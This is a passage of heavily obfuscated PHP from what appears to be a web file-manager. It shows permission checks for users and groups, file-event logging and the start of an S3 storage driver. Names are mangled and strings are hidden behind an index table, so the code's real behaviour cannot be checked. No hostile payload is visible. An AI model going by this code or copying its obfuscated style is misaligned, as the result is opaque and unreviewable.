$_SERVER[ÔÕ±ĞšÎ]; $ºô„‚ñù = Model($×«¾ÀÏ’[587])->getInfo($÷Ó…Ğ«¡); return array($×«¾ÀÏ’[2190] => intval($ãù˜©¥[$×«¾ÀÏ’[489]]), $×«¾ÀÏ’[2173] => $ãù˜©¥, $×«¾ÀÏ’[2191] => LNG($×«¾ÀÏ’[2192]), $×«¾ÀÏ’[2182] => array($×«¾ÀÏ’[496] => $ºô„‚ñù[$×«¾ÀÏ’[32]], $×«¾ÀÏ’[87] => KodIO::make($ºô„‚ñù[$×«¾ÀÏ’[90]][$×«¾ÀÏ’[193]]), $×«¾ÀÏ’[2189] => $ºô„‚ñù[$×«¾ÀÏ’[591]])); } protected function groupRootAuth($ÖÉ«ô‘‘, $ÀĞÏ´ª­ = false) { $ğ»õíÄÓ =& $_SERVER[ÔÕ±ĞšÎ]; $ÀĞÏ´ª­ = $ÀĞÏ´ª­ ? $ÀĞÏ´ª­ : USER_ID; $ÖÑò÷¥º = $ÀĞÏ´ª­ . $ğ»õíÄÓ[2193] . $ÖÉ«ô‘‘; static $êèÙÎÂî = array(); if (isset($êèÙÎÂî[$ÖÑò÷¥º])) { return $êèÙÎÂî[$ÖÑò÷¥º]; } $ÍœÏªĞ¼ = Model($ğ»õíÄÓ[587])->getInfo($ÖÉ«ô‘‘); $ú¶î¼×¥ = $this->userGroupList($ÀĞÏ´ª­); $­°çô€Ì = isset($ú¶î¼×¥[$ÖÉ«ô‘‘]) ? $ú¶î¼×¥[$ÖÉ«ô‘‘][$ğ»õíÄÓ[489]] : !1; if ($­°çô€Ì && Model($ğ»õíÄÓ[573])->authCheckAction($­°çô€Ì[$ğ»õíÄÓ[489]], $ğ»õíÄÓ[1999])) { $êèÙÎÂî[$ÖÑò÷¥º] = $­°çô€Ì; return $­°çô€Ì; } $àÁÅ÷›† = $this->sourceAuthSelect($ÍœÏªĞ¼[$ğ»õíÄÓ[90]][$ğ»õíÄÓ[193]]); $Ä÷±ü¤ = $àÁÅ÷›† ? $this->authMake($àÁÅ÷›†, $ÀĞÏ´ª­) : !1; $‰Õªë‰Ê = $Ä÷±ü¤ ? $Ä÷±ü¤[$ğ»õíÄÓ[542]] : !1; $êèÙÎÂî[$ÖÑò÷¥º] = $‰Õªë‰Ê ? $‰Õªë‰Ê : $­°çô€Ì; return $êèÙÎÂî[$ÖÑò÷¥º]; } public function authOwnerApply($¥ÌË‹êÔ) { $Ú‰ ¡É =& $_SERVER[ÔÕ±ĞšÎ]; if (empty($¥ÌË‹êÔ[$Ú‰ ¡É[489]]) || isset($¥ÌË‹êÔ[$Ú‰ ¡É[2194]]) && $¥ÌË‹êÔ[$Ú‰ ¡É[2194]]) { return $¥ÌË‹êÔ; } if (AuthModel::authCheckRoot($¥ÌË‹êÔ[$Ú‰ ¡É[489]][$Ú‰ ¡É[490]])) { return $¥ÌË‹êÔ; } $â¥ô…ø = Model($Ú‰ ¡É[1423])->parentLevelArray($¥ÌË‹êÔ[$Ú‰ ¡É[586]]); $â¥ô…ø = array_merge(array($¥ÌË‹êÔ[$Ú‰ ¡É[193]]), array_reverse($â¥ô…ø)); $ÃšİíëÃ = $this->sourceAuthSelect($â¥ô…ø); $‰ŒÌ·õƒ = array(); $•á­êéº = array(); foreach ($ÃšİíëÃ as $ƒé ©ª˜ => $ÔŸ›§úÜ) { $½ôï«æú = $this->authFolderOwnerUser($ÔŸ›§úÜ); $‰ŒÌ·õƒ[$ƒé ©ª˜] = $½ôï«æú; $•á­êéº = array_merge($•á­êéº, $½ôï«æú[$Ú‰ ¡É[667]]); if ($½ôï«æú[$Ú‰ ¡É[2195]]) { break; } } if (count($•á­êéº) == 0) { $•á­êéº = $this->authFolderOwnerGroup($¥ÌË‹êÔ[$Ú‰ ¡É[571]]); } $•á­êéº = array_unique($•á­êéº); if (AuthModel::authCheckRoot($¥ÌË‹êÔ[$Ú‰ ¡É[489]][$Ú‰ ¡É[490]])) { $•á­êéº[] = USER_ID; } $¥ÌË‹êÔ[$Ú‰ ¡É[489]][$Ú‰ ¡É[2196]] = Model($Ú‰ ¡É[579])->userListInfo($•á­êéº); return $¥ÌË‹êÔ; } private function authFolderOwnerGroup($×Æ…ªâ) { $ÍÊÇôŸñ =& $_SERVER[ÔÕ±ĞšÎ]; $õò­ÅŸ™ = Model($ÍÊÇôŸñ[2073])->where(array($ÍÊÇôŸñ[1978] => $×Æ…ªâ))->select(); $ìÎşÅ¿ = array(); if (!$õò­ÅŸ™) { return $ìÎşÅ¿; } foreach ($õò­ÅŸ™ as $Ë“øó™Á) { $˜ŠÇÜ§ = $this->authInfo($Ë“øó™Á); if (AuthModel::authCheckRoot($˜ŠÇÜ§[$ÍÊÇôŸñ[489]])) { $ìÎşÅ¿[] = $Ë“øó™Á[$ÍÊÇôŸñ[1777]]; } } return $ìÎşÅ¿; } private function authFolderOwnerUser($ãò€Ÿî¼) { $ÕÙı‡Õª =& $_SERVER[ÔÕ±ĞšÎ]; $”ä€Ø§ô = array(); $÷Àä¡è» = !1; foreach ($ãò€Ÿî¼ as $íËÀÆæ†) { $èá¯÷¡Í = $this->authInfo($íËÀÆæ†); if ($íËÀÆæ†[$ÕÙı‡Õª[571]] == $ÕÙı‡Õª[230]) { $÷Àä¡è» = !0; } if ($íËÀÆæ†[$ÕÙı‡Õª[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($èá¯÷¡Í[$ÕÙı‡Õª[489]])) { $”ä€Ø§ô[] = $íËÀÆæ†[$ÕÙı‡Õª[571]]; } } } return array($ÕÙı‡Õª[667] => $”ä€Ø§ô, $ÕÙı‡Õª[2195] => $÷Àä¡è»); } public function authMake($Ö»ä¤½Í, $•ùš“Ü• = false) { $ô‹’¬ =& $_SERVER[ÔÕ±ĞšÎ]; $îšõÍÃñ = $this->authArrayCheck($Ö»ä¤½Í, $•ùš“Ü•); if ($îšõÍÃñ[$ô‹’¬[2197]]) { $îšõÍÃñ[$ô‹’¬[2197]] = $this->sourceAuthInfo($îšõÍÃñ[$ô‹’¬[2197]]); } return $îšõÍÃñ; } public function authArrayCheck($«•òãĞ…, $„ÈÀ£î = false) { $ê–ïÔì =& $_SERVER[ÔÕ±ĞšÎ]; if (!$«•òãĞ…) { return array($ê–ïÔì[490] => 0, $ê–ïÔì[542] => !1); } $„ÈÀ£î = $„ÈÀ£î ? $„ÈÀ£î : USER_ID; $îòí¹àô = 0; $ÆøºĞ¹¨ = 0; $µÄÎ£¡˜ = 0; $ØşĞìÏ× = 0; $°ÉÈßÎç = 0; $—ÀÃÑÑ¸ = 0; $áß´ ® = 1000; $ë­Æä¾Ÿ = 0; $±½ŒÁÑ = 0; $™ˆ‡æûÌ = 0; $Ö¸›àÄ³ = 0; $‡ªìÓŸ° = array($ê–ïÔì[193] => 0); foreach ($«•òãĞ… as $‡ªìÓŸ°) { $¡–ó¡êØ = $this->authInfo($‡ªìÓŸ°); if (!$¡–ó¡êØ) { continue; } $‚ˆ‰«·† = $‡ªìÓŸ°[$ê–ïÔì[571]]; $¥Ö¾Ìû = intval($¡–ó¡êØ[$ê–ïÔì[489]]); if ($‡ªìÓŸ°[$ê–ïÔì[190]] == SourceModel::TYPE_USER && $‚ˆ‰«·† == $„ÈÀ£î) { $îòí¹àô = !0; $µÄÎ£¡˜ = $¡–ó¡êØ; $ÆøºĞ¹¨ = $¥Ö¾Ìû; } else { if ($‡ªìÓŸ°[$ê–ïÔì[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($‚ˆ‰«·†, $„ÈÀ£î)) { $ØşĞìÏ× = !0; $–Æ€˜™Ö = $this->groupStepToUserGroup($‚ˆ‰«·†, $„ÈÀ£î); if ($–Æ€˜™Ö < $áß´ ®) { $áß´ ® = $–Æ€˜™Ö; $°ÉÈßÎç = $¥Ö¾Ìû; $—ÀÃÑÑ¸ = $¡–ó¡êØ; $ë­Æä¾Ÿ = $‚ˆ‰«·†; } if ($–Æ€˜™Ö == $áß´ ® && $¥Ö¾Ìû >= $°ÉÈßÎç) { $°ÉÈßÎç = $¥Ö¾Ìû; $—ÀÃÑÑ¸ = $¡–ó¡êØ; $ë­Æä¾Ÿ = $‚ˆ‰«·†; } } else { if ($‚ˆ‰«·† == $ê–ïÔì[230]) { $±½ŒÁÑ = !0; $Ö¸›àÄ³ = $¡–ó¡êØ; $™ˆ‡æûÌ = $¥Ö¾Ìû; } } } } if ($îòí¹àô) { $¤‚†œÆ¤ = $ÆøºĞ¹¨; $¡–ó¡êØ = $µÄÎ£¡˜; $à³Å±Ç = LNG($ê–ïÔì[2198]); } else { if ($ØşĞìÏ×) { $¤‚†œÆ¤ = $°ÉÈßÎç; $¡–ó¡êØ = $—ÀÃÑÑ¸; $ôÓêŒñ¦ = Model($ê–ïÔì[587])->getInfo($ë­Æä¾Ÿ); $à³Å±Ç = $ê–ïÔì[176] . $ôÓêŒñ¦[$ê–ïÔì[591]] . $ê–ïÔì[2199] . LNG($ê–ïÔì[2200]); } else { if ($±½ŒÁÑ) { $¤‚†œÆ¤ = $™ˆ‡æûÌ; $¡–ó¡êØ = $Ö¸›àÄ³; $à³Å±Ç = LNG($ê–ïÔì[2170]); } else { $¤‚†œÆ¤ = 0; $¡–ó¡êØ = !1; $à³Å±Ç = $ê–ïÔì[12]; } } } $¥˜ºıºñ = array($ê–ïÔì[2190] => intval($¤‚†œÆ¤), $ê–ïÔì[2173] => $¡–ó¡êØ, $ê–ïÔì[2191] => $à³Å±Ç, $ê–ïÔì[2182] => $‡ªìÓŸ°[$ê–ïÔì[193]]); return $¥˜ºıºñ; } private function groupContainUser($†¦ĞÊ˜, $ƒˆåß¹¦ = false) { return in_array($†¦ĞÊ˜, $this->userGroupParents($ƒˆåß¹¦)); } private function groupStepToUserGroup($Ã‹é¡ñ, $õÙŸèéğ = false) { $ãƒÔÉ³ï =& $_SERVER[ÔÕ±ĞšÎ]; $éŞõ´˜ø = $this->userGroupList($õÙŸèéğ); $¤õê˜Ì = 1000; $§ìÑæ•‹ = $GLOBALS[$ãƒÔÉ³ï[6]][$ãƒÔÉ³ï[92]][$ãƒÔÉ³ï[2086]] == 1; $šï Ÿ‡œ = $§ìÑæ•‹ ? 3 : 2; foreach ($éŞõ´˜ø as $÷ô‹ûíÀ) { if ($÷ô‹ûíÀ[$ãƒÔÉ³ï[1978]] == $Ã‹é¡ñ) { return 0; } $„Àİ¤º = explode($ãƒÔÉ³ï[50], trim($÷ô‹ûíÀ[$ãƒÔÉ³ï[586]], $ãƒÔÉ³ï[50])); if ($„Àİ¤º[0] == $ãƒÔÉ³ï[230] && count($„Àİ¤º) > $šï Ÿ‡œ) { $¯‰Ã¡ºÍ = array_reverse(array_slice($„Àİ¤º, $šï Ÿ‡œ)); $’ùÜæê = array_search($Ã‹é¡ñ, $¯‰Ã¡ºÍ); if ($’ùÜæê !== !1 && $’ùÜæê + 1 <= $¤õê˜Ì) { $¤õê˜Ì = $’ùÜæê + 1; } } } return $¤õê˜Ì; } private function userGroupList($ÀÛİã‡¥ = false) { $Ùñœíùã =& $_SERVER[ÔÕ±ĞšÎ]; static $€Šò‰˜ä = array(); if (isset($€Šò‰˜ä[$ÀÛİã‡¥])) { return $€Šò‰˜ä[$ÀÛİã‡¥]; } $†Îïüş° = Model($Ùñœíùã[599])->getInfo($ÀÛİã‡¥); $€Šò‰˜ä[$ÀÛİã‡¥] = array_to_keyvalue($†Îïüş°[$Ùñœíùã[2171]], $Ùñœíùã[1978]); return $€Šò‰˜ä[$ÀÛİã‡¥]; } public function userGroupParents($ôÖƒº†) { $ß¶ÒÒŸ =& $_SERVER[ÔÕ±ĞšÎ]; static $™ªÎÜĞ÷ = array(); $ôÖƒº† = $ôÖƒº† ? $ôÖƒº† : USER_ID; if (isset($™ªÎÜĞ÷[$ôÖƒº†])) { return $™ªÎÜĞ÷[$ôÖƒº†]; } $€†õ“ôÑ = $this->userGroupList($ôÖƒº†); $ı„ÊøÔ‚ = array(); $¢ôéàîó = $GLOBALS[$ß¶ÒÒŸ[6]][$ß¶ÒÒŸ[92]][$ß¶ÒÒŸ[2086]] == 1; $Ã‡å ¦ã = $¢ôéàîó ? 3 : 2; foreach ($€†õ“ôÑ as $¦Ú£êì³) { $ôâüõ•£ = array($¦Ú£êì³[$ß¶ÒÒŸ[1978]]); $‹£Åù¤ = explode($ß¶ÒÒŸ[50], trim($¦Ú£êì³[$ß¶ÒÒŸ[586]], $ß¶ÒÒŸ[50])); if ($‹£Åù¤[0] == $ß¶ÒÒŸ[230] && count($‹£Åù¤) > $Ã‡å ¦ã) { $·½Ì¸Æé = array_slice($‹£Åù¤, $Ã‡å ¦ã); $ôâüõ•£ = array_merge($ôâüõ•£, array_reverse($·½Ì¸Æé)); } $ı„ÊøÔ‚ = array_merge($ı„ÊøÔ‚, $ôâüõ•£); } $™ªÎÜĞ÷[$ôÖƒº†] = array_unique($ı„ÊøÔ‚); return $™ªÎÜĞ÷[$ôÖƒº†]; } public function authTargetInfoMake($œËÇ•¸Ä) { $¹’ÊÊ¿Ë =& $_SERVER[ÔÕ±ĞšÎ]; $İèÌ¨¾• = array(); $É×¼…è = array(); foreach ($œËÇ•¸Ä as $´Äí”¹) { if ($´Äí”¹[$¹’ÊÊ¿Ë[190]] == SourceModel::TYPE_USER) { $İèÌ¨¾•[] = intval($´Äí”¹[$¹’ÊÊ¿Ë[571]]); } else { if ($´Äí”¹[$¹’ÊÊ¿Ë[190]] == SourceModel::TYPE_GROUP) { $É×¼…è[] = intval($´Äí”¹[$¹’ÊÊ¿Ë[571]]); } } } if ($İèÌ¨¾•) { $İèÌ¨¾• = Model($¹’ÊÊ¿Ë[579])->userListInfo($İèÌ¨¾•); } if ($É×¼…è) { $ô÷¶Óü¥ = array($¹’ÊÊ¿Ë[2071] => array($¹’ÊÊ¿Ë[494], $É×¼…è)); $É×¼…è = Model($¹’ÊÊ¿Ë[587])->field($¹’ÊÊ¿Ë[2201])->where($ô÷¶Óü¥)->select(); $É×¼…è = array_to_keyvalue($É×¼…è, $¹’ÊÊ¿Ë[1978]); } return array($¹’ÊÊ¿Ë[2202] => $İèÌ¨¾•, $¹’ÊÊ¿Ë[2203] => $É×¼…è); } public function authInfo($Ÿ‘şÏÆÉ) { $Â˜‚œı =& $_SERVER[ÔÕ±ĞšÎ]; if ($Ÿ‘şÏÆÉ[$Â˜‚œı[2087]]) { $®çúÌŸä = Model($Â˜‚œı[573])->listData($Ÿ‘şÏÆÉ[$Â˜‚œı[2087]]); if (!$®çúÌŸä) { return !1; $ø¥ƒœ·ù = Model($Â˜‚œı[573])->listData(); $‘òà¢À¬ = array_filter_by_field($ø¥ƒœ·ù, $Â˜‚œı[489], $Â˜‚œı[230]); return $‘òà¢À¬; } $ñË¬‰ã = array_field_key($®çúÌŸä, array($Â˜‚œı[477], $Â˜‚œı[32], $Â˜‚œı[489], $Â˜‚œı[2001], $Â˜‚œı[2002])); $ñË¬‰ã[$Â˜‚œı[2204]] = $Ÿ‘şÏÆÉ; return $ñË¬‰ã; } else { return array($Â˜‚œı[495] => 0, $Â˜‚œı[1984] => $Ÿ‘şÏÆÉ[$Â˜‚œı[2148]], $Â˜‚œı[496] => $Â˜‚œı[12], $Â˜‚œı[2001] => $Â˜‚œı[2205]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\x75\162\143\x65\137\x65\x76\x65\156\164"; protected $dataAuto = array(array("\x63\x72\145\141\164\x65\124\151\x6d\145", "\x74\151\x6d\x65", "\151\156\163\145\162\x74", "\x66\165\x6e\143\164\x69\x6f\x6e"), array("\144\145\x73\143", '', "\151\x6e\163\x65\162\164\x2c\165\160\144\x61\x74\x65\54\163\x65\x6c\145\x63\x74", "\152\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($çÕÏ¾ÖÌ, $ŠÎº›Å›, $…¬¶éî² = '') { $Å¥ÇÛ±£ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->eventSave) { return; } $úû—¤‡í = Model($Å¥ÇÛ±£[1423])->sourceInfo($çÕÏ¾ÖÌ); if (!$úû—¤‡í) { return !1; } if ($this->isDisableEvent($úû—¤‡í, $ŠÎº›Å›)) { return; } if ($…¬¶éî² && is_string($…¬¶éî²)) { $…¬¶éî² = array($Å¥ÇÛ±£[2018] => $…¬¶éî²); } $¶Ş¦¸ÃÖ = defined($Å¥ÇÛ±£[2206]) ? USER_ID : 0; $ÔõïÂŒ = array($Å¥ÇÛ±£[493] => $çÕÏ¾ÖÌ, $Å¥ÇÛ±£[2207] => $úû—¤‡í[$Å¥ÇÛ±£[192]], $Å¥ÇÛ±£[2208] => $úû—¤‡í[$Å¥ÇÛ±£[32]], $Å¥ÇÛ±£[584] => !empty($úû—¤‡í[$Å¥ÇÛ±£[584]]) ? $úû—¤‡í[$Å¥ÇÛ±£[584]] : $Å¥ÇÛ±£[12], $Å¥ÇÛ±£[1768] => $¶Ş¦¸ÃÖ, $Å¥ÇÛ±£[498] => $ŠÎº›Å›, $Å¥ÇÛ±£[1770] => $…¬¶éî²); $this->addSystemLog($ŠÎº›Å›, $ÔõïÂŒ); unset($ÔõïÂŒ[$Å¥ÇÛ±£[2208]], $ÔõïÂŒ[$Å¥ÇÛ±£[584]]); return $this->add($ÔõïÂŒ); } private function addSystemLog($›à¤º´ª, $ïí’©Î) { $ğ“‰¢½¤ =& $_SERVER[ÔÕ±ĞšÎ]; if ($›à¤º´ª == $ğ“‰¢½¤[2209]) { $›à¤º´ª = $ïí’©Î[$ğ“‰¢½¤[528]][$ğ“‰¢½¤[2210]]; } else { if (in_array($›à¤º´ª, array($ğ“‰¢½¤[1957], $ğ“‰¢½¤[2211]))) { $›à¤º´ª = $ïí’©Î[$ğ“‰¢½¤[528]][$ğ“‰¢½¤[171]]; } } $Ü‹Òœå½ = array_merge($ïí’©Î, array($ğ“‰¢½¤[2212] => $ïí’©Î[$ğ“‰¢½¤[193]], $ğ“‰¢½¤[2213] => $ïí’©Î[$ğ“‰¢½¤[2213]])); Hook::trigger($ğ“‰¢½¤[2214], $ğ“‰¢½¤[2215] . $›à¤º´ª, $ïí’©Î); Model($ğ“‰¢½¤[1921])->addLog($ğ“‰¢½¤[2215] . $›à¤º´ª, $Ü‹Òœå½); } private function isDisableEvent($êˆåö¯”, $‡Ò‰Ó–) { $¢ÂË’Ô’ =& $_SERVER[ÔÕ±ĞšÎ]; if ($êˆåö¯”[$¢ÂË’Ô’[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($‡Ò‰Ó– == $¢ÂË’Ô’[1946]) { return !1; } return !0; } public function eventCreate($‡ÈÆ”÷’, $¡‚Ú—’») { $¶çæ¤­ì =& $_SERVER[ÔÕ±ĞšÎ]; $û…§ƒşÂ = Model($¶çæ¤­ì[1423])->sourceInfo($‡ÈÆ”÷’); $êË†ÖÆ = array($¶çæ¤­ì[2210] => $¡‚Ú—’», $¶çæ¤­ì[32] => $û…§ƒşÂ[$¶çæ¤­ì[32]]); return $this->addEvent($‡ÈÆ”÷’, $¶çæ¤­ì[2209], $êË†ÖÆ); } public function eventFileEdit($¯°åÆºÁ) { $šò–¸éó =& $_SERVER[ÔÕ±ĞšÎ]; $®ŠõâÁâ = array($šò–¸éó[2216] => $_SERVER[$šò–¸éó[2217]], $šò–¸éó[2218] => strtolower(ACTION)); if (isset($GLOBALS[$šò–¸éó[7]][$šò–¸éó[2219]])) { $®ŠõâÁâ[$šò–¸éó[2219]] = $šò–¸éó[91]; } return $this->addEvent($¯°åÆºÁ, $šò–¸éó[1947], $®ŠõâÁâ); } public function eventRecycle($»Œ©§ò’, $…Şˆ¸³) { return $this->addEvent($»Œ©§ò’, $_SERVER[ÔÕ±ĞšÎ][2211], $…Şˆ¸³); } private static $_removeLast = ''; public function eventRemove($º²õ®ĞÄ) { $Òáê«ÌÑ =& $_SERVER[ÔÕ±ĞšÎ]; self::$_removeLast = $º²õ®ĞÄ; $°©È‰Ù = Model($Òáê«ÌÑ[1423])->sourceInfo($º²õ®ĞÄ); $³èäôôü = array_field_key($°©È‰Ù, array($Òáê«ÌÑ[193], $Òáê«ÌÑ[543], $Òáê«ÌÑ[507], $Òáê«ÌÑ[586])); $ù†¥ôàæ = array($Òáê«ÌÑ[171] => $°©È‰Ù[$Òáê«ÌÑ[32]], $Òáê«ÌÑ[2218] => ACTION, $Òáê«ÌÑ[2220] => $³èäôôü); return $this->addEvent($°©È‰Ù[$Òáê«ÌÑ[192]], $Òáê«ÌÑ[1946], $ù†¥ôàæ); } public function eventShare($¹ÊÎØŠã, $Ö³æ”çá) { return $this->addEvent($¹ÊÎØŠã, $_SERVER[ÔÕ±ĞšÎ][1957], $Ö³æ”çá); } public function eventMove($å–ªáöò, $±±Ç‚µÕ, $‘šñğ) { $õóúãÔ‰ =& $_SERVER[ÔÕ±ĞšÎ]; if (self::$_removeLast == $å–ªáöò) { return; } $à©…üÖ– = Model($õóúãÔ‰[1423]); $†Û¬Üå” = $à©…üÖ–->sourceInfo($å–ªáöò); $ôÜæœá” = $à©…üÖ–->sourceInfo($±±Ç‚µÕ); $ÀòÌ„µÕ = $à©…üÖ–->sourceInfo($‘šñğ); $¯è·Ôèë = array($õóúãÔ‰[1243] => $±±Ç‚µÕ, $õóúãÔ‰[2221] => $ôÜæœá”[$õóúãÔ‰[32]], $õóúãÔ‰[2197] => !empty($ôÜæœá”[$õóúãÔ‰[584]]) ? $ôÜæœá”[$õóúãÔ‰[584]] : $õóúãÔ‰[12], $õóúãÔ‰[1244] => $‘šñğ, $õóúãÔ‰[2222] => $ÀòÌ„µÕ[$õóúãÔ‰[32]], $õóúãÔ‰[2223] => !empty($ÀòÌ„µÕ[$õóúãÔ‰[584]]) ? $ÀòÌ„µÕ[$õóúãÔ‰[584]] : $õóúãÔ‰[12]); $this->addEvent($å–ªáöò, $õóúãÔ‰[625], $¯è·Ôèë); $†Û¬Üå” = $à©…üÖ–->sourceInfo($å–ªáöò); $¯è·Ôèë = array($õóúãÔ‰[193] => $†Û¬Üå”[$õóúãÔ‰[193]], $õóúãÔ‰[32] => $†Û¬Üå”[$õóúãÔ‰[32]]); $this->addEvent($±±Ç‚µÕ, $õóúãÔ‰[2224], $¯è·Ôèë); } public function eventCopy($µÍÈè¤¤) { $this->eventCreate($µÍÈè¤¤, $_SERVER[ÔÕ±ĞšÎ][623]); } public function eventRename($º„’²É, $éğÜİ”, $¾‹È ‘¿) { $­™Û³Úş =& $_SERVER[ÔÕ±ĞšÎ]; $Ñ¬¤ÀˆÏ = array($­™Û³Úş[1243] => $éğÜİ”, $­™Û³Úş[1244] => $¾‹È ‘¿); return $this->addEvent($º„’²É, $­™Û³Úş[1437], $Ñ¬¤ÀˆÏ); } public function eventAddComment($éÄ¨–Î, $ğ»Ó›ã) { return $this->addEvent($éÄ¨–Î, $_SERVER[ÔÕ±ĞšÎ][2225], $ğ»Ó›ã); } public function eventAddDesc($ó˜Å«ë®, $”Ø•™Úá) { return $this->addEvent($ó˜Å«ë®, $_SERVER[ÔÕ±ĞšÎ][2226], $”Ø•™Úá); } public function listBySource($—û£ø‘­) { $úúô¾£ˆ =& $_SERVER[ÔÕ±ĞšÎ]; $ØÃ¢¿¤š = Model($úúô¾£ˆ[1423])->sourceInfo($—û£ø‘­); $´¿¥á¡ğ = array($úúô¾£ˆ[493] => $—û£ø‘­); if ($ØÃ¢¿¤š[$úúô¾£ˆ[487]] == $úúô¾£ˆ[91]) { $Û¤Õ¶  = Model($úúô¾£ˆ[1423])->listSearchChildren($—û£ø‘­, 20000); $Û¤Õ¶ [] = $—û£ø‘­ . $úúô¾£ˆ[456]; $´¿¥á¡ğ = array($úúô¾£ˆ[193] => array($úúô¾£ˆ[7], $Û¤Õ¶ )); } $å«›†¸ù = $this->where($´¿¥á¡ğ)->order($úúô¾£ˆ[2227])->selectPage(); if ($å«›†¸ù[$úúô¾£ˆ[444]][$úúô¾£ˆ[445]] == 0) { $å«›†¸ù[$úúô¾£ˆ[444]][$úúô¾£ˆ[445]] = 1; $å«›†¸ù[$úúô¾£ˆ[447]] = array(array($úúô¾£ˆ[493] => $—û£ø‘­, $úúô¾£ˆ[2207] => $ØÃ¢¿¤š[$úúô¾£ˆ[192]], $úúô¾£ˆ[1768] => $ØÃ¢¿¤š[$úúô¾£ˆ[529]], $úúô¾£ˆ[498] => $úúô¾£ˆ[2228], $úúô¾£ˆ[499] => $ØÃ¢¿¤š[$úúô¾£ˆ[233]], $úúô¾£ˆ[1770] => $úúô¾£ˆ[12])); } return $this->eventListParse($å«›†¸ù, $—û£ø‘­); } private function eventListParse($ó·èÎ£Á, $…‘ıæß¶) { $Ø¿ÈÖõ“ =& $_SERVER[ÔÕ±ĞšÎ]; $éò÷áŠã = $ó·èÎ£Á[$Ø¿ÈÖõ“[447]]; $Ïš¾´­ = array_to_keyvalue($éò÷áŠã, $Ø¿ÈÖõ“[12], $Ø¿ÈÖõ“[193]); $¤”Ä†ˆ = array_to_keyvalue($éò÷áŠã, $Ø¿ÈÖõ“[12], $Ø¿ÈÖõ“[2213]); foreach ($éò÷áŠã as $¶…”¡Ü˜) { $ûƒøİÃ = $¶…”¡Ü˜[$Ø¿ÈÖõ“[528]]; if ($¶…”¡Ü˜[$Ø¿ÈÖõ“[33]] == $Ø¿ÈÖõ“[625] && isset($ûƒøİÃ[$Ø¿ÈÖõ“[1243]])) { $Ïš¾´­[] = $ûƒøİÃ[$Ø¿ÈÖõ“[1243]] . $Ø¿ÈÖõ“[12]; $Ïš¾´­[] = $ûƒøİÃ[$Ø¿ÈÖõ“[1244]] . $Ø¿ÈÖõ“[12]; } if ($¶…”¡Ü˜[$Ø¿ÈÖõ“[33]] == $Ø¿ÈÖõ“[2224] && isset($ûƒøİÃ[$Ø¿ÈÖõ“[193]])) { $Ïš¾´­[] = $ûƒøİÃ[$Ø¿ÈÖõ“[193]] . $Ø¿ÈÖõ“[12]; } } $Ïš¾´­ = array_merge($Ïš¾´­, $¤”Ä†ˆ, array($…‘ıæß¶ . $Ø¿ÈÖõ“[12])); $Ïš¾´­ = array_unique($Ïš¾´­); $ÊµÁ¿¹â = array_unique(array_to_keyvalue($éò÷áŠã, $Ø¿ÈÖõ“[12], $Ø¿ÈÖõ“[1777])); $Ë±¯Èø” = Model($Ø¿ÈÖõ“[599])->userListInfo($ÊµÁ¿¹â); $à¿©ïæü = Model($Ø¿ÈÖõ“[899])->sourceListInfo($Ïš¾´­, !0); foreach ($éò÷áŠã as &$¶…”¡Ü˜) { if ($¶…”¡Ü˜[$Ø¿ÈÖõ“[33]] == $Ø¿ÈÖõ“[625] && isset($¶…”¡Ü˜[$Ø¿ÈÖõ“[528]][$Ø¿ÈÖõ“[1243]])) { $¶…”¡Ü˜[$Ø¿ÈÖõ“[528]][$Ø¿ÈÖõ“[1243]] = $à¿©ïæü[$¶…”¡Ü˜[$Ø¿ÈÖõ“[528]][$Ø¿ÈÖõ“[1243]]]; $¶…”¡Ü˜[$Ø¿ÈÖõ“[528]][$Ø¿ÈÖõ“[1244]] = $à¿©ïæü[$¶…”¡Ü˜[$Ø¿ÈÖõ“[528]][$Ø¿ÈÖõ“[1244]]]; } if ($¶…”¡Ü˜[$Ø¿ÈÖõ“[33]] == $Ø¿ÈÖõ“[2224] && isset($¶…”¡Ü˜[$Ø¿ÈÖõ“[528]][$Ø¿ÈÖõ“[193]])) { $¶…”¡Ü˜[$Ø¿ÈÖõ“[528]][$Ø¿ÈÖõ“[193]] = $à¿©ïæü[$¶…”¡Ü˜[$Ø¿ÈÖõ“[528]][$Ø¿ÈÖõ“[193]]]; } $¶…”¡Ü˜[$Ø¿ÈÖõ“[90]] = $à¿©ïæü[$¶…”¡Ü˜[$Ø¿ÈÖõ“[193]]]; $¶…”¡Ü˜[$Ø¿ÈÖõ“[2229]] = $à¿©ïæü[$¶…”¡Ü˜[$Ø¿ÈÖõ“[2213]]]; if ($¶…”¡Ü˜[$Ø¿ÈÖõ“[33]] == $Ø¿ÈÖõ“[1946]) { $¶…”¡Ü˜[$Ø¿ÈÖõ“[2229]] = $¶…”¡Ü˜[$Ø¿ÈÖõ“[90]]; $¶…”¡Ü˜[$Ø¿ÈÖõ“[2213]] = $¶…”¡Ü˜[$Ø¿ÈÖõ“[2229]][$Ø¿ÈÖõ“[193]]; $¶…”¡Ü˜[$Ø¿ÈÖõ“[90]] = !1; $¶…”¡Ü˜[$Ø¿ÈÖõ“[193]] = $Ø¿ÈÖõ“[12]; } $¶…”¡Ü˜[$Ø¿ÈÖõ“[2156]] = $Ë±¯Èø”[$¶…”¡Ü˜[$Ø¿ÈÖõ“[1777]]]; } unset($¶…”¡Ü˜); $ó·èÎ£Á[$Ø¿ÈÖõ“[447]] = $éò÷áŠã; return $ó·èÎ£Á; } public function removeBySource($Äò…Şâ¡) { $õ÷¤íã› = array($_SERVER[ÔÕ±ĞšÎ][493] => $Äò…Şâ¡); $this->where($õ÷¤íã›)->remove(); } } goto Bšªƒè–; DÒ‚äÍÀ²ê: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($•¦‰ÌÊ) { $Ì„òùª¶ =& $_SERVER[ÔÕ±ĞšÎ]; parent::__construct($•¦‰ÌÊ); $ßË¾¼Ñæ = isset($•¦‰ÌÊ[$Ì„òùª¶[258]]) && $•¦‰ÌÊ[$Ì„òùª¶[258]] == $Ì„òùª¶[249] ? $Ì„òùª¶[249] : $Ì„òùª¶[315]; $this->setSignVersion($ßË¾¼Ñæ); } public function link($Çåüò, $¡°‰Â ¨ = array()) { return parent::link($Çåüò, $¡°‰Â ¨); } public function fileOut($—éÔ÷, $Ğá£âËû = false, 